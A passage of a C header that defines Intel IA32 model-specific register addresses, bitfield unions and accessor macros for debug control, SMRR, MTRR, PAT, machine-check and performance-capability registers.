#define IA32_PACKAGE_THERM_INTERRUPT_THRESHOLD2_INTERRUPT_ENABLE_FLAG 0x800000
#define IA32_PACKAGE_THERM_INTERRUPT_THRESHOLD2_INTERRUPT_ENABLE_MASK 0x01
#define IA32_PACKAGE_THERM_INTERRUPT_THRESHOLD2_INTERRUPT_ENABLE(_) (((_) >> 23) & 0x01)

    /**
     * [Bit 24] Pkg Power Limit Notification Enable.
     */
    UINT64 PowerLimitNotificationEnable : 1;
#define IA32_PACKAGE_THERM_INTERRUPT_POWER_LIMIT_NOTIFICATION_ENABLE_BIT 24
#define IA32_PACKAGE_THERM_INTERRUPT_POWER_LIMIT_NOTIFICATION_ENABLE_FLAG 0x1000000
#define IA32_PACKAGE_THERM_INTERRUPT_POWER_LIMIT_NOTIFICATION_ENABLE_MASK 0x01
#define IA32_PACKAGE_THERM_INTERRUPT_POWER_LIMIT_NOTIFICATION_ENABLE(_) (((_) >> 24) & 0x01)
    UINT64 Reserved3 : 39;
  };

  UINT64 Flags;
} IA32_PACKAGE_THERM_INTERRUPT_REGISTER;

/**
 * Trace/Profile Resource Control.
 *
 * @remarks 06_0EH
 */
#define IA32_DEBUGCTL 0x000001D9
typedef union {
  struct {
    /**
     * [Bit 0] Setting this bit to 1 enables the processor to record a running trace of the most
     * recent branches taken by the processor in the LBR stack.
     *
     * @remarks 06_01H
     */
    UINT64 Lbr : 1;
#define IA32_DEBUGCTL_LBR_BIT 0
#define IA32_DEBUGCTL_LBR_FLAG 0x01
#define IA32_DEBUGCTL_LBR_MASK 0x01
#define IA32_DEBUGCTL_LBR(_) (((_) >> 0) & 0x01)

    /**
     * [Bit 1] Setting this bit to 1 enables the processor to treat EFLAGS.TF as single-step on
     * branches instead of single-step on instructions.
     *
     * @remarks 06_01H
     */
    UINT64 Btf : 1;
#define IA32_DEBUGCTL_BTF_BIT 1
#define IA32_DEBUGCTL_BTF_FLAG 0x02
#define IA32_DEBUGCTL_BTF_MASK 0x01
#define IA32_DEBUGCTL_BTF(_) (((_) >> 1) & 0x01)
    UINT64 Reserved1 : 4;

    /**
     * [Bit 6] Setting this bit to 1 enables branch trace messages to be sent.
     *
     * @remarks 06_0EH
     */
    UINT64 Tr : 1;
#define IA32_DEBUGCTL_TR_BIT 6
#define IA32_DEBUGCTL_TR_FLAG 0x40
#define IA32_DEBUGCTL_TR_MASK 0x01
#define IA32_DEBUGCTL_TR(_) (((_) >> 6) & 0x01)

    /**
     * [Bit 7] Setting this bit enables branch trace messages (BTMs) to be logged in a BTS buffer.
     *
     * @remarks 06_0EH
     */
    UINT64 Bts : 1;
#define IA32_DEBUGCTL_BTS_BIT 7
#define IA32_DEBUGCTL_BTS_FLAG 0x80
#define IA32_DEBUGCTL_BTS_MASK 0x01
#define IA32_DEBUGCTL_BTS(_) (((_) >> 7) & 0x01)

    /**
     * [Bit 8] When clear, BTMs are logged in a BTS buffer in circular fashion. When this bit is
     * set, an interrupt is generated by the BTS facility when the BTS buffer is full.
     *
     * @remarks 06_0EH
     */
    UINT64 Btint : 1;
#define IA32_DEBUGCTL_BTINT_BIT 8
#define IA32_DEBUGCTL_BTINT_FLAG 0x100
#define IA32_DEBUGCTL_BTINT_MASK 0x01
#define IA32_DEBUGCTL_BTINT(_) (((_) >> 8) & 0x01)

    /**
     * [Bit 9] When set, BTS or BTM is skipped if CPL = 0.
     *
     * @remarks 06_0FH
     */
    UINT64 BtsOffOs : 1;
#define IA32_DEBUGCTL_BTS_OFF_OS_BIT 9
#define IA32_DEBUGCTL_BTS_OFF_OS_FLAG 0x200
#define IA32_DEBUGCTL_BTS_OFF_OS_MASK 0x01
#define IA32_DEBUGCTL_BTS_OFF_OS(_) (((_) >> 9) & 0x01)

    /**
     * [Bit 10] When set, BTS or BTM is skipped if CPL > 0.
     *
     * @remarks 06_0FH
     */
    UINT64 BtsOffUsr : 1;
#define IA32_DEBUGCTL_BTS_OFF_USR_BIT 10
#define IA32_DEBUGCTL_BTS_OFF_USR_FLAG 0x400
#define IA32_DEBUGCTL_BTS_OFF_USR_MASK 0x01
#define IA32_DEBUGCTL_BTS_OFF_USR(_) (((_) >> 10) & 0x01)

    /**
     * [Bit 11] When set, the LBR stack is frozen on a PMI request.
     *
     * @remarks If CPUID.01H: ECX[15] = 1 && CPUID.0AH: EAX[7:0] > 1
     */
    UINT64 FreezeLbrsOnPmi : 1;
#define IA32_DEBUGCTL_FREEZE_LBRS_ON_PMI_BIT 11
#define IA32_DEBUGCTL_FREEZE_LBRS_ON_PMI_FLAG 0x800
#define IA32_DEBUGCTL_FREEZE_LBRS_ON_PMI_MASK 0x01
#define IA32_DEBUGCTL_FREEZE_LBRS_ON_PMI(_) (((_) >> 11) & 0x01)

    /**
     * [Bit 12] When set, each ENABLE bit of the global counter control MSR are frozen (address
     * 38FH) on a PMI request.
     *
     * @remarks If CPUID.01H: ECX[15] = 1 && CPUID.0AH: EAX[7:0] > 1
     */
    UINT64 FreezePerfmonOnPmi : 1;
#define IA32_DEBUGCTL_FREEZE_PERFMON_ON_PMI_BIT 12
#define IA32_DEBUGCTL_FREEZE_PERFMON_ON_PMI_FLAG 0x1000
#define IA32_DEBUGCTL_FREEZE_PERFMON_ON_PMI_MASK 0x01
#define IA32_DEBUGCTL_FREEZE_PERFMON_ON_PMI(_) (((_) >> 12) & 0x01)

    /**
     * [Bit 13] When set, enables the logical processor to receive and generate PMI on behalf of the
     * uncore.
     *
     * @remarks 06_1AH
     */
    UINT64 EnableUncorePmi : 1;
#define IA32_DEBUGCTL_ENABLE_UNCORE_PMI_BIT 13
#define IA32_DEBUGCTL_ENABLE_UNCORE_PMI_FLAG 0x2000
#define IA32_DEBUGCTL_ENABLE_UNCORE_PMI_MASK 0x01
#define IA32_DEBUGCTL_ENABLE_UNCORE_PMI(_) (((_) >> 13) & 0x01)

    /**
     * [Bit 14] When set, freezes perfmon and trace messages while in SMM.
     *
     * @remarks If IA32_PERF_CAPABILITIES[12] = 1
     */
    UINT64 FreezeWhileSmm : 1;
#define IA32_DEBUGCTL_FREEZE_WHILE_SMM_BIT 14
#define IA32_DEBUGCTL_FREEZE_WHILE_SMM_FLAG 0x4000
#define IA32_DEBUGCTL_FREEZE_WHILE_SMM_MASK 0x01
#define IA32_DEBUGCTL_FREEZE_WHILE_SMM(_) (((_) >> 14) & 0x01)

    /**
     * [Bit 15] When set, enables DR7 debug bit on XBEGIN.
     *
     * @remarks If (CPUID.(EAX=07H, ECX=0):EBX[11] = 1)
     */
    UINT64 RtmDebug : 1;
#define IA32_DEBUGCTL_RTM_DEBUG_BIT 15
#define IA32_DEBUGCTL_RTM_DEBUG_FLAG 0x8000
#define IA32_DEBUGCTL_RTM_DEBUG_MASK 0x01
#define IA32_DEBUGCTL_RTM_DEBUG(_) (((_) >> 15) & 0x01)
    UINT64 Reserved2 : 48;
  };

  UINT64 Flags;
} IA32_DEBUGCTL_REGISTER;

/**
 * @brief SMRR Base Address <b>(Writeable only in SMM)</b>
 *
 * SMRR Base Address. Base address of SMM memory range.
 *
 * @remarks If IA32_MTRRCAP.SMRR[11] = 1
 */
#define IA32_SMRR_PHYSBASE 0x000001F2
typedef union {
  struct {
    /**
     * @brief Type
     *
     * [Bits 7:0] Type. Specifies memory type of the range.
     */
    UINT64 Type : 8;
#define IA32_SMRR_PHYSBASE_TYPE_BIT 0
#define IA32_SMRR_PHYSBASE_TYPE_FLAG 0xFF
#define IA32_SMRR_PHYSBASE_TYPE_MASK 0xFF
#define IA32_SMRR_PHYSBASE_TYPE(_) (((_) >> 0) & 0xFF)
    UINT64 Reserved1 : 4;

    /**
     * [Bits 31:12] SMRR physical Base Address.
     */
    UINT64 SmrrPhysicalBaseAddress : 20;
#define IA32_SMRR_PHYSBASE_SMRR_PHYSICAL_BASE_ADDRESS_BIT 12
#define IA32_SMRR_PHYSBASE_SMRR_PHYSICAL_BASE_ADDRESS_FLAG 0xFFFFF000
#define IA32_SMRR_PHYSBASE_SMRR_PHYSICAL_BASE_ADDRESS_MASK 0xFFFFF
#define IA32_SMRR_PHYSBASE_SMRR_PHYSICAL_BASE_ADDRESS(_) (((_) >> 12) & 0xFFFFF)
    UINT64 Reserved2 : 32;
  };

  UINT64 Flags;
} IA32_SMRR_PHYSBASE_REGISTER;

/**
 * @brief SMRR Range Mask <b>(Writeable only in SMM)</b>
 *
 * Range Mask of SMM memory range.
 *
 * @remarks If IA32_MTRRCAP[SMRR] = 1
 */
#define IA32_SMRR_PHYSMASK 0x000001F3
typedef union {
  struct {
    UINT64 Reserved1 : 11;

    /**
     * [Bit 11] Enable range mask.
     */
    UINT64 EnableRangeMask : 1;
#define IA32_SMRR_PHYSMASK_ENABLE_RANGE_MASK_BIT 11
#define IA32_SMRR_PHYSMASK_ENABLE_RANGE_MASK_FLAG 0x800
#define IA32_SMRR_PHYSMASK_ENABLE_RANGE_MASK_MASK 0x01
#define IA32_SMRR_PHYSMASK_ENABLE_RANGE_MASK(_) (((_) >> 11) & 0x01)

    /**
     * [Bits 31:12] SMRR address range mask.
     */
    UINT64 SmrrAddressRangeMask : 20;
#define IA32_SMRR_PHYSMASK_SMRR_ADDRESS_RANGE_MASK_BIT 12
#define IA32_SMRR_PHYSMASK_SMRR_ADDRESS_RANGE_MASK_FLAG 0xFFFFF000
#define IA32_SMRR_PHYSMASK_SMRR_ADDRESS_RANGE_MASK_MASK 0xFFFFF
#define IA32_SMRR_PHYSMASK_SMRR_ADDRESS_RANGE_MASK(_) (((_) >> 12) & 0xFFFFF)
    UINT64 Reserved2 : 32;
  };

  UINT64 Flags;
} IA32_SMRR_PHYSMASK_REGISTER;

/**
 * DCA Capability.
 *
 * @remarks If CPUID.01H: ECX[18] = 1
 */
#define IA32_PLATFORM_DCA_CAP 0x000001F8

/**
 * If set, CPU supports Prefetch-Hint type.
 *
 * @remarks If CPUID.01H: ECX[18] = 1
 */
#define IA32_CPU_DCA_CAP 0x000001F9

/**
 * DCA type 0 Status and Control register.
 *
 * @remarks If CPUID.01H: ECX[18] = 1
 */
#define IA32_DCA_0_CAP 0x000001FA
typedef union {
  struct {
    /**
     * [Bit 0] Set by HW when DCA is fuseenabled and no defeatures are set.
     */
    UINT64 DcaActive : 1;
#define IA32_DCA_0_CAP_DCA_ACTIVE_BIT 0
#define IA32_DCA_0_CAP_DCA_ACTIVE_FLAG 0x01
#define IA32_DCA_0_CAP_DCA_ACTIVE_MASK 0x01
#define IA32_DCA_0_CAP_DCA_ACTIVE(_) (((_) >> 0) & 0x01)

    /**
     * [Bits 2:1] TRANSACTION.
     */
    UINT64 Transaction : 2;
#define IA32_DCA_0_CAP_TRANSACTION_BIT 1
#define IA32_DCA_0_CAP_TRANSACTION_FLAG 0x06
#define IA32_DCA_0_CAP_TRANSACTION_MASK 0x03
#define IA32_DCA_0_CAP_TRANSACTION(_) (((_) >> 1) & 0x03)

    /**
     * [Bits 6:3] DCA_TYPE.
     */
    UINT64 DcaType : 4;
#define IA32_DCA_0_CAP_DCA_TYPE_BIT 3
#define IA32_DCA_0_CAP_DCA_TYPE_FLAG 0x78
#define IA32_DCA_0_CAP_DCA_TYPE_MASK 0x0F
#define IA32_DCA_0_CAP_DCA_TYPE(_) (((_) >> 3) & 0x0F)

    /**
     * [Bits 10:7] DCA_QUEUE_SIZE.
     */
    UINT64 DcaQueueSize : 4;
#define IA32_DCA_0_CAP_DCA_QUEUE_SIZE_BIT 7
#define IA32_DCA_0_CAP_DCA_QUEUE_SIZE_FLAG 0x780
#define IA32_DCA_0_CAP_DCA_QUEUE_SIZE_MASK 0x0F
#define IA32_DCA_0_CAP_DCA_QUEUE_SIZE(_) (((_) >> 7) & 0x0F)
    UINT64 Reserved1 : 2;

    /**
     * [Bits 16:13] Writes will update the register but have no HW side-effect.
     */
    UINT64 DcaDelay : 4;
#define IA32_DCA_0_CAP_DCA_DELAY_BIT 13
#define IA32_DCA_0_CAP_DCA_DELAY_FLAG 0x1E000
#define IA32_DCA_0_CAP_DCA_DELAY_MASK 0x0F
#define IA32_DCA_0_CAP_DCA_DELAY(_) (((_) >> 13) & 0x0F)
    UINT64 Reserved2 : 7;

    /**
     * [Bit 24] SW can request DCA block by setting this bit.
     */
    UINT64 SwBlock : 1;
#define IA32_DCA_0_CAP_SW_BLOCK_BIT 24
#define IA32_DCA_0_CAP_SW_BLOCK_FLAG 0x1000000
#define IA32_DCA_0_CAP_SW_BLOCK_MASK 0x01
#define IA32_DCA_0_CAP_SW_BLOCK(_) (((_) >> 24) & 0x01)
    UINT64 Reserved3 : 1;

    /**
     * [Bit 26] Set when DCA is blocked by HW (e.g. CR0.CD = 1).
     */
    UINT64 HwBlock : 1;
#define IA32_DCA_0_CAP_HW_BLOCK_BIT 26
#define IA32_DCA_0_CAP_HW_BLOCK_FLAG 0x4000000
#define IA32_DCA_0_CAP_HW_BLOCK_MASK 0x01
#define IA32_DCA_0_CAP_HW_BLOCK(_) (((_) >> 26) & 0x01)
    UINT64 Reserved4 : 37;
  };

  UINT64 Flags;
} IA32_DCA_0_CAP_REGISTER;

/**
 * @defgroup IA32_MTRR_PHYSBASE \
 *           IA32_MTRR_PHYSBASE(n)
 *
 * IA32_MTRR_PHYSBASE(0-9).
 *
 * @remarks If CPUID.01H: EDX.MTRR[12] = 1
 * @see Vol3A[11.11.2.3(Variable Range MTRRs)]
 * @{
 */
typedef union {
  struct {
    /**
     * [Bits 7:0] Specifies the memory type for the range.
     */
    UINT64 Type : 8;
#define IA32_MTRR_PHYSBASE_TYPE_BIT 0
#define IA32_MTRR_PHYSBASE_TYPE_FLAG 0xFF
#define IA32_MTRR_PHYSBASE_TYPE_MASK 0xFF
#define IA32_MTRR_PHYSBASE_TYPE(_) (((_) >> 0) & 0xFF)
    UINT64 Reserved1 : 4;

    /**
     * [Bits 47:12] Specifies the base address of the address range. This 24-bit value, in the case
     * where MAXPHYADDR is 36 bits, is extended by 12 bits at the low end to form the base address
     * (this automatically aligns the address on a 4-KByte boundary).
     */
    UINT64 PageFrameNumber : 36;
#define IA32_MTRR_PHYSBASE_PAGE_FRAME_NUMBER_BIT 12
#define IA32_MTRR_PHYSBASE_PAGE_FRAME_NUMBER_FLAG 0xFFFFFFFFF000
#define IA32_MTRR_PHYSBASE_PAGE_FRAME_NUMBER_MASK 0xFFFFFFFFF
#define IA32_MTRR_PHYSBASE_PAGE_FRAME_NUMBER(_) (((_) >> 12) & 0xFFFFFFFFF)
    UINT64 Reserved2 : 16;
  };

  UINT64 Flags;
} IA32_MTRR_PHYSBASE_REGISTER;

#define IA32_MTRR_PHYSBASE0 0x00000200
#define IA32_MTRR_PHYSBASE1 0x00000202
#define IA32_MTRR_PHYSBASE2 0x00000204
#define IA32_MTRR_PHYSBASE3 0x00000206
#define IA32_MTRR_PHYSBASE4 0x00000208
#define IA32_MTRR_PHYSBASE5 0x0000020A
#define IA32_MTRR_PHYSBASE6 0x0000020C
#define IA32_MTRR_PHYSBASE7 0x0000020E
#define IA32_MTRR_PHYSBASE8 0x00000210
#define IA32_MTRR_PHYSBASE9 0x00000212
/**
 * @}
 */

/**
 * @defgroup IA32_MTRR_PHYSMASK \
 *           IA32_MTRR_PHYSMASK(n)
 *
 * IA32_MTRR_PHYSMASK(0-9).
 *
 * @remarks If CPUID.01H: EDX.MTRR[12] = 1
 * @see Vol3A[11.11.2.3(Variable Range MTRRs)]
 * @{
 */
typedef union {
  struct {
    /**
     * [Bits 7:0] Specifies the memory type for the range.
     */
    UINT64 Type : 8;
#define IA32_MTRR_PHYSMASK_TYPE_BIT 0
#define IA32_MTRR_PHYSMASK_TYPE_FLAG 0xFF
#define IA32_MTRR_PHYSMASK_TYPE_MASK 0xFF
#define IA32_MTRR_PHYSMASK_TYPE(_) (((_) >> 0) & 0xFF)
    UINT64 Reserved1 : 3;

    /**
     * [Bit 11] Enables the register pair when set; disables register pair when clear.
     */
    UINT64 Valid : 1;
#define IA32_MTRR_PHYSMASK_VALID_BIT 11
#define IA32_MTRR_PHYSMASK_VALID_FLAG 0x800
#define IA32_MTRR_PHYSMASK_VALID_MASK 0x01
#define IA32_MTRR_PHYSMASK_VALID(_) (((_) >> 11) & 0x01)

    /**
     * [Bits 47:12] Specifies a mask (24 bits if the maximum physical address size is 36 bits, 28
     * bits if the maximum physical address size is 40 bits). The mask determines the range of the
     * region being mapped, according to the following relationships:
     * - Address_Within_Range AND PhysMask = PhysBase AND PhysMask
     * - This value is extended by 12 bits at the low end to form the mask value.
     * - The width of the PhysMask field depends on the maximum physical address size supported by
     * the processor. CPUID.80000008H reports the maximum physical address size supported by the
     * processor. If CPUID.80000008H is not available, software may assume that the processor
     * supports a 36-bit physical address size.
     *
     * @see Vol3A[11.11.3(Example Base and Mask Calculations)]
     */
    UINT64 PageFrameNumber : 36;
#define IA32_MTRR_PHYSMASK_PAGE_FRAME_NUMBER_BIT 12
#define IA32_MTRR_PHYSMASK_PAGE_FRAME_NUMBER_FLAG 0xFFFFFFFFF000
#define IA32_MTRR_PHYSMASK_PAGE_FRAME_NUMBER_MASK 0xFFFFFFFFF
#define IA32_MTRR_PHYSMASK_PAGE_FRAME_NUMBER(_) (((_) >> 12) & 0xFFFFFFFFF)
    UINT64 Reserved2 : 16;
  };

  UINT64 Flags;
} IA32_MTRR_PHYSMASK_REGISTER;

#define IA32_MTRR_PHYSMASK0 0x00000201
#define IA32_MTRR_PHYSMASK1 0x00000203
#define IA32_MTRR_PHYSMASK2 0x00000205
#define IA32_MTRR_PHYSMASK3 0x00000207
#define IA32_MTRR_PHYSMASK4 0x00000209
#define IA32_MTRR_PHYSMASK5 0x0000020B
#define IA32_MTRR_PHYSMASK6 0x0000020D
#define IA32_MTRR_PHYSMASK7 0x0000020F
#define IA32_MTRR_PHYSMASK8 0x00000211
#define IA32_MTRR_PHYSMASK9 0x00000213
/**
 * @}
 */

/**
 * @defgroup IA32_MTRR_FIX \
 *           IA32_MTRR_FIX(x)
 *
 * IA32_MTRR_FIX(x).
 *
 * @remarks If CPUID.01H: EDX.MTRR[12] = 1
 * @see Vol3A[11.11.2.2(Fixed Range MTRRs)]
 * @{
 */
/**
 * @defgroup IA32_MTRR_FIX64K \
 *           IA32_MTRR_FIX64K(x)
 *
 * IA32_MTRR_FIX64K(x).
 * @{
 */
#define IA32_MTRR_FIX64K_BASE 0x00000000
#define IA32_MTRR_FIX64K_SIZE 0x00010000
#define IA32_MTRR_FIX64K_00000 0x00000250
/**
 * @}
 */

/**
 * @defgroup IA32_MTRR_FIX16K \
 *           IA32_MTRR_FIX16K(x)
 *
 * IA32_MTRR_FIX16K(x).
 * @{
 */
#define IA32_MTRR_FIX16K_BASE 0x00080000
#define IA32_MTRR_FIX16K_SIZE 0x00004000
#define IA32_MTRR_FIX16K_80000 0x00000258
#define IA32_MTRR_FIX16K_A0000 0x00000259
/**
 * @}
 */

/**
 * @defgroup IA32_MTRR_FIX4K \
 *           IA32_MTRR_FIX4K(x)
 *
 * IA32_MTRR_FIX4K(x).
 * @{
 */
#define IA32_MTRR_FIX4K_BASE 0x000C0000
#define IA32_MTRR_FIX4K_SIZE 0x00001000
#define IA32_MTRR_FIX4K_C0000 0x00000268
#define IA32_MTRR_FIX4K_C8000 0x00000269
#define IA32_MTRR_FIX4K_D0000 0x0000026A
#define IA32_MTRR_FIX4K_D8000 0x0000026B
#define IA32_MTRR_FIX4K_E0000 0x0000026C
#define IA32_MTRR_FIX4K_E8000 0x0000026D
#define IA32_MTRR_FIX4K_F0000 0x0000026E
#define IA32_MTRR_FIX4K_F8000 0x0000026F
/**
 * @}
 */

/**
 * Architecture defined number of fixed range MTRRs (1 for 64k, 2 for 16k, 8 for 4k).
 */
#define IA32_MTRR_FIX_COUNT ((1 + 2 + 8) * 8)

/**
 * Architecture defined number of variable range MTRRs.
 */
#define IA32_MTRR_VARIABLE_COUNT 0x000000FF

/**
 * A size of array to store all possible MTRRs.
 */
#define IA32_MTRR_COUNT (IA32_MTRR_FIX_COUNT + IA32_MTRR_VARIABLE_COUNT)
/**
 * @}
 */

/**
 * IA32_PAT.
 *
 * @remarks If CPUID.01H: EDX.MTRR[16] = 1
 */
#define IA32_PAT 0x00000277
typedef union {
  struct {
    /**
     * [Bits 2:0] PA0.
     */
    UINT64 Pa0 : 3;
#define IA32_PAT_PA0_BIT 0
#define IA32_PAT_PA0_FLAG 0x07
#define IA32_PAT_PA0_MASK 0x07
#define IA32_PAT_PA0(_) (((_) >> 0) & 0x07)
    UINT64 Reserved1 : 5;

    /**
     * [Bits 10:8] PA1.
     */
    UINT64 Pa1 : 3;
#define IA32_PAT_PA1_BIT 8
#define IA32_PAT_PA1_FLAG 0x700
#define IA32_PAT_PA1_MASK 0x07
#define IA32_PAT_PA1(_) (((_) >> 8) & 0x07)
    UINT64 Reserved2 : 5;

    /**
     * [Bits 18:16] PA2.
     */
    UINT64 Pa2 : 3;
#define IA32_PAT_PA2_BIT 16
#define IA32_PAT_PA2_FLAG 0x70000
#define IA32_PAT_PA2_MASK 0x07
#define IA32_PAT_PA2(_) (((_) >> 16) & 0x07)
    UINT64 Reserved3 : 5;

    /**
     * [Bits 26:24] PA3.
     */
    UINT64 Pa3 : 3;
#define IA32_PAT_PA3_BIT 24
#define IA32_PAT_PA3_FLAG 0x7000000
#define IA32_PAT_PA3_MASK 0x07
#define IA32_PAT_PA3(_) (((_) >> 24) & 0x07)
    UINT64 Reserved4 : 5;

    /**
     * [Bits 34:32] PA4.
     */
    UINT64 Pa4 : 3;
#define IA32_PAT_PA4_BIT 32
#define IA32_PAT_PA4_FLAG 0x700000000
#define IA32_PAT_PA4_MASK 0x07
#define IA32_PAT_PA4(_) (((_) >> 32) & 0x07)
    UINT64 Reserved5 : 5;

    /**
     * [Bits 42:40] PA5.
     */
    UINT64 Pa5 : 3;
#define IA32_PAT_PA5_BIT 40
#define IA32_PAT_PA5_FLAG 0x70000000000
#define IA32_PAT_PA5_MASK 0x07
#define IA32_PAT_PA5(_) (((_) >> 40) & 0x07)
    UINT64 Reserved6 : 5;

    /**
     * [Bits 50:48] PA6.
     */
    UINT64 Pa6 : 3;
#define IA32_PAT_PA6_BIT 48
#define IA32_PAT_PA6_FLAG 0x7000000000000
#define IA32_PAT_PA6_MASK 0x07
#define IA32_PAT_PA6(_) (((_) >> 48) & 0x07)
    UINT64 Reserved7 : 5;

    /**
     * [Bits 58:56] PA7.
     */
    UINT64 Pa7 : 3;
#define IA32_PAT_PA7_BIT 56
#define IA32_PAT_PA7_FLAG 0x700000000000000
#define IA32_PAT_PA7_MASK 0x07
#define IA32_PAT_PA7(_) (((_) >> 56) & 0x07)
    UINT64 Reserved8 : 5;
  };

  UINT64 Flags;
} IA32_PAT_REGISTER;

/**
 * @defgroup IA32_MC_CTL2 \
 *           IA32_MC(i)_CTL2
 *
 * MSR to enable/disable CMCI capability for bank n.
 *
 * @remarks If IA32_MCG_CAP[10] = 1 && IA32_MCG_CAP[7:0] > n
 * @see Vol3B[15.3.2.5(IA32_MCi_CTL2 MSRs)]
 * @{
 */
#define IA32_MC0_CTL2 0x00000280
#define IA32_MC1_CTL2 0x00000281
#define IA32_MC2_CTL2 0x00000282
#define IA32_MC3_CTL2 0x00000283
#define IA32_MC4_CTL2 0x00000284
#define IA32_MC5_CTL2 0x00000285
#define IA32_MC6_CTL2 0x00000286
#define IA32_MC7_CTL2 0x00000287
#define IA32_MC8_CTL2 0x00000288
#define IA32_MC9_CTL2 0x00000289
#define IA32_MC10_CTL2 0x0000028A
#define IA32_MC11_CTL2 0x0000028B
#define IA32_MC12_CTL2 0x0000028C
#define IA32_MC13_CTL2 0x0000028D
#define IA32_MC14_CTL2 0x0000028E
#define IA32_MC15_CTL2 0x0000028F
#define IA32_MC16_CTL2 0x00000290
#define IA32_MC17_CTL2 0x00000291
#define IA32_MC18_CTL2 0x00000292
#define IA32_MC19_CTL2 0x00000293
#define IA32_MC20_CTL2 0x00000294
#define IA32_MC21_CTL2 0x00000295
#define IA32_MC22_CTL2 0x00000296
#define IA32_MC23_CTL2 0x00000297
#define IA32_MC24_CTL2 0x00000298
#define IA32_MC25_CTL2 0x00000299
#define IA32_MC26_CTL2 0x0000029A
#define IA32_MC27_CTL2 0x0000029B
#define IA32_MC28_CTL2 0x0000029C
#define IA32_MC29_CTL2 0x0000029D
#define IA32_MC30_CTL2 0x0000029E
#define IA32_MC31_CTL2 0x0000029F
typedef union {
  struct {
    /**
     * [Bits 14:0] Corrected error count threshold.
     */
    UINT64 CorrectedErrorCountThreshold : 15;
#define IA32_MC_CTL2_CORRECTED_ERROR_COUNT_THRESHOLD_BIT 0
#define IA32_MC_CTL2_CORRECTED_ERROR_COUNT_THRESHOLD_FLAG 0x7FFF
#define IA32_MC_CTL2_CORRECTED_ERROR_COUNT_THRESHOLD_MASK 0x7FFF
#define IA32_MC_CTL2_CORRECTED_ERROR_COUNT_THRESHOLD(_) (((_) >> 0) & 0x7FFF)
    UINT64 Reserved1 : 15;

    /**
     * [Bit 30] CMCI_EN.
     */
    UINT64 CmciEn : 1;
#define IA32_MC_CTL2_CMCI_EN_BIT 30
#define IA32_MC_CTL2_CMCI_EN_FLAG 0x40000000
#define IA32_MC_CTL2_CMCI_EN_MASK 0x01
#define IA32_MC_CTL2_CMCI_EN(_) (((_) >> 30) & 0x01)
    UINT64 Reserved2 : 33;
  };

  UINT64 Flags;
} IA32_MC_CTL2_REGISTER;

/**
 * @}
 */

/**
 * IA32_MTRR_DEF_TYPE.
 *
 * @remarks If CPUID.01H: EDX.MTRR[12] = 1
 */
#define IA32_MTRR_DEF_TYPE 0x000002FF
typedef union {
  struct {
    /**
     * [Bits 2:0] Default Memory Type.
     */
    UINT64 DefaultMemoryType : 3;
#define IA32_MTRR_DEF_TYPE_DEFAULT_MEMORY_TYPE_BIT 0
#define IA32_MTRR_DEF_TYPE_DEFAULT_MEMORY_TYPE_FLAG 0x07
#define IA32_MTRR_DEF_TYPE_DEFAULT_MEMORY_TYPE_MASK 0x07
#define IA32_MTRR_DEF_TYPE_DEFAULT_MEMORY_TYPE(_) (((_) >> 0) & 0x07)
    UINT64 Reserved1 : 7;

    /**
     * [Bit 10] Fixed Range MTRR Enable.
     */
    UINT64 FixedRangeMtrrEnable : 1;
#define IA32_MTRR_DEF_TYPE_FIXED_RANGE_MTRR_ENABLE_BIT 10
#define IA32_MTRR_DEF_TYPE_FIXED_RANGE_MTRR_ENABLE_FLAG 0x400
#define IA32_MTRR_DEF_TYPE_FIXED_RANGE_MTRR_ENABLE_MASK 0x01
#define IA32_MTRR_DEF_TYPE_FIXED_RANGE_MTRR_ENABLE(_) (((_) >> 10) & 0x01)

    /**
     * [Bit 11] MTRR Enable.
     */
    UINT64 MtrrEnable : 1;
#define IA32_MTRR_DEF_TYPE_MTRR_ENABLE_BIT 11
#define IA32_MTRR_DEF_TYPE_MTRR_ENABLE_FLAG 0x800
#define IA32_MTRR_DEF_TYPE_MTRR_ENABLE_MASK 0x01
#define IA32_MTRR_DEF_TYPE_MTRR_ENABLE(_) (((_) >> 11) & 0x01)
    UINT64 Reserved2 : 52;
  };

  UINT64 Flags;
} IA32_MTRR_DEF_TYPE_REGISTER;

/**
 * @defgroup IA32_FIXED_CTR \
 *           IA32_FIXED_CTR(n)
 *
 * Fixed-Function Performance Counter n.
 *
 * @remarks If CPUID.0AH: EDX[4:0] > n
 * @{
 */
/**
 * Counts Instr_Retired.Any.
 */
#define IA32_FIXED_CTR0 0x00000309

/**
 * Counts CPU_CLK_Unhalted.Core
 */
#define IA32_FIXED_CTR1 0x0000030A

/**
 * Counts CPU_CLK_Unhalted.Ref
 */
#define IA32_FIXED_CTR2 0x0000030B
/**
 * @}
 */

/**
 * Read Only MSR that enumerates the existence of performance monitoring features.
 *
 * @remarks If CPUID.01H: ECX[15] = 1
 */
#define IA32_PERF_CAPABILITIES 0x00000345
typedef union {
  struct {
    /**
     * [Bits 5:0] LBR format.
     */
    UINT64 LbrFormat : 6;
#define IA32_PERF_CAPABILITIES_LBR_FORMAT_BIT 0
#define IA32_PERF_CAPABILITIES_LBR_FORMAT_FLAG 0x3F
#define IA32_PERF_CAPABILITIES_LBR_FORMAT_MASK 0x3F
#define IA32_PERF_CAPABILITIES_LBR_FORMAT(_) (((_) >> 0) & 0x3F)

    /**
     * [Bit 6] PEBS Trap.
     */
    UINT64 PebsTrap : 1;
#define IA32_PERF_CAPABILITIES_PEBS_TRAP_BIT 6
#define IA32_PERF_CAPABILITIES_PEBS_TRAP_FLAG 0x40
#define IA32_PERF_CAPABILITIES_PEBS_TRAP_MASK 0x01
#define IA32_PERF_CAPABILITIES_PEBS_TRAP(_) (((_) >> 6) & 0x01)

    /**
     * [Bit 7] PEBSSaveArchRegs.
     */
    UINT64 PebsSaveArchRegs : 1;
#define IA32_PERF_CAPABILITIES_PEBS_SAVE_ARCH_REGS_BIT 7
#define IA32_PERF_CAPABILITIES_PEBS_SAVE_ARCH_REGS_FLAG 0x80
#define IA32_PERF_CAPABILITIES_PEBS_SAVE_ARCH_REGS_MASK 0x01
#define IA32_PERF_CAPABILITIES_PEBS_SAVE_ARCH_REGS(_) (((_) >> 7) & 0x01)

    /**
     * [Bits 11:8] PEBS Record Format.
     */
    UINT64 PebsRecordFormat : 4;
#define IA32_PERF_CAPABILITIES_PEBS_RECORD_FORMAT_BIT 8
#define IA32_PERF_CAPABILITIES_PEBS_RECORD_FORMAT_FLAG 0xF00
#define IA32_PERF_CAPABILITIES_PEBS_RECORD_FORMAT_MASK 0x0F
#define IA32_PERF_CAPABILITIES_PEBS_RECORD_FORMAT(_) (((_) >> 8) & 0x0F)

    /**
     * [Bit 12] Freeze while SMM is supported.
     */
    UINT64 FreezeWhileSmmIsSupported : 1;
